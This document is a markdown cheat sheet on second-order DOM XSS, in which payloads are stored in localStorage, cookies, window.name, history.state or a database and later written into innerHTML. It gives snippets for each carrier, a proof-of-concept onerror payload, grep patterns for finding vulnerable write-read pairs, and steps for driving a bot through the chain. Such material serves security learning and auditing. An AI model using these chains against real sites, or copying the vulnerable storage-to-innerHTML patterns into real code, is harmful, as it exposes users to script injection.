# Second-order DOM flows — storage-carried and deferred sinks

The payload enters one place, persists (localStorage/cookie/DB),
then lands in a sink on a LATER page or session. The source and
the sink are temporally separated — the injection point and the
execution point are different pages.

---

## 1. The storage-carrier family — localStorage/sessionStorage

```javascript
// page A (the injection):
localStorage.x = location.hash.slice(1);   // attacker input stored

// page B (later — the sink):
el.innerHTML = localStorage.x;
   → the stored value becomes markup on a different page
```

The pair: WRITE on page A + READ-into-sink on page B. Neither page
alone is vulnerable — the chain is the vuln.

```javascript
// the carriers:
localStorage.setItem('k', x)
sessionStorage.setItem('k', x)
document.cookie = 'k='+x
indexedDB.put(...) / objectStore.add(...)
Cache.put(...)          -- service-worker cache
```

---

## 2. The cookie carrier — `document.cookie` write→read

```javascript
// page A:
document.cookie = 'x='+location.hash.slice(1)+';path=/';

// page B:
var v = document.cookie.match(/x=([^;]+)/)[1];
el.innerHTML = decodeURIComponent(v);
   → the cookie value becomes markup later
```

Cookie-carried XSS is the standard "self-XSS the cookie" pivot —
a cookie you can write (via any cookie-write primitive) becomes
markup on a page that reads it.

---

## 3. The window.name carrier — the cross-navigation one

```javascript
// your page (the opener):
window.name = '<img src=x onerror=alert(1)>';
location = 'https://target.com/page-that-reads-name';

// the target's page:
el.innerHTML = name;   // or window.name — reads the opener-set value
```

`window.name` survives navigation — the opener sets it before
leaving, the target page reads it after loading. The classic
cross-page carrier — needs a target that reads `name`.

---

## 4. The postMessage storage-bridge — write-once-read-later

```javascript
// attacker frame → target listener → stored:
window.addEventListener('message', e=>{
   localStorage.saved = e.data;
});
// later page reads localStorage.saved into innerHTML
```

postMessage is the WRITE primitive — localStorage is the carrier —
innerHTML is the sink. Three-part chain.

---

## 5. The hash-reload flow — fragment persists

```javascript
// page A redirects to page B carrying the hash:
location = '/page-b#'+payload;

// page B reads location.hash into a sink:
el.innerHTML = location.hash.slice(1);
```

The fragment rides the navigation — the source is "the URL that
brought them here" not "their input on this page".

---

## 6. The back/forward-state — history.state carrier

```javascript
// pushState stores arbitrary data in history:
history.pushState({x: location.hash.slice(1)}, '', '/page-b');

// page B (navigated back/forward to):
el.innerHTML = history.state.x;
```

`history.state` persists across navigation — the carrier for
SPA-style apps.

---

## 7. The DB-carried stored-XSS — the server-side variant

```javascript
// POST /api/note  {body: <img src=x onerror=alert(1)>}
// the server stores it
// GET /notes → server renders it → any viewer's browser fires
```

Server-side storage — the classic stored-XSS (`stored-xss.md`) —
the distinction: DOM-side storage (localStorage) vs server-side
(DB). Both are "second-order" — the write and the fire are
separated.

---

## 8. The deferred-read pattern — read-the-URL-later

```javascript
// the source is read LATE:
window.addEventListener('load', () => {
   el.innerHTML = location.search;   // read on load — not at
});                                   // parse time
   → your URL's ?x= payload fires on the load event — still works
```

Async/deferred source-reads — the source is the same URL but
read after the page is built. Same exploitation, different timing.

---

## 9. The worker-carrier — worker.postMessage → innerHTML

```javascript
// the worker sends to the page:
worker.postMessage(payload);
// the page's onmessage → innerHTML:
worker.onmessage = e => el.innerHTML = e.data;
```

The worker's message becomes the source — the chain is the same
as postMessage but through the worker channel.

---

## 10. The detection — finding the write→read pair

```text
1. find all SINK reads of localStorage/sessionStorage/cookie/name
   /history.state — the sink-side
2. for each, find what WRITES that key — the source-side
3. the write-side's input → the read-side's sink — the chain
4. the two can be on different pages — trace the STORAGE KEY not
   the page
```

The audit question: "who writes `localStorage.x`?" → "who reads
`localStorage.x` into innerHTML?" — the pair is the vuln.

```javascript
// grep for the writes:
localStorage.setItem(|localStorage\[|sessionStorage.|document.cookie=
// grep for the reads-into-sinks:
innerHTML.*localStorage|innerHTML.*sessionStorage|innerHTML.*cookie
innerHTML.*window.name|innerHTML.*history.state
```

---

## 11. The exploitation — the multi-step chain

```text
1. the WRITE primitive — a page/param/attr that stores your input
2. the SINK page — a page that reads the stored key into a sink
3. get the bot to visit the WRITE then the SINK (or the sink
   alone if the storage persists)
```

For localStorage the storage is per-origin — the bot's browser
has to do BOTH the write and the read. For cookie/server-stored
the write can come from anywhere that reaches the cookie-name.

The two-visit requirement is the catch — the bot must first visit
the writing page THEN the reading page (or the writing page
persists in the same session). window.name carriers need the
opener→target navigation chain.
